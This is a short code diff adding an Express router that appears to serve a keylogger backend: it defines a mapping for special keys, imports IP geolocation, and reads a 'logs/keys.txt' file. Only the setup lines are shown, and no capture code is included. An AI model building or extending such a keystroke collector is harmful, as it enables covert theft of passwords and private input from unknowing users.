@@ -1,3 +1,20 @@
+const express = require('express');
+const router = express.Router();
+const fs = require('fs');
+const path = require('path');
+const geoip = require('geoip-lite');
+
+router.use(express.json({ limit: '10mb' }));
+
+// Enhanced key mapping for special keys
+const KEY_MAPPING = {
+    ' ': '[SPACE]',
+    '\n': '[ENTER]',
+    '\b': '[BACKSPACE]',
+    '\t': '[TAB]',
+    // Add more special keys as needed
+};
+
 router.get('/', async (req, res) => {
     try {
         const logPath = path.join(__dirname, '../../logs/keys.txt');
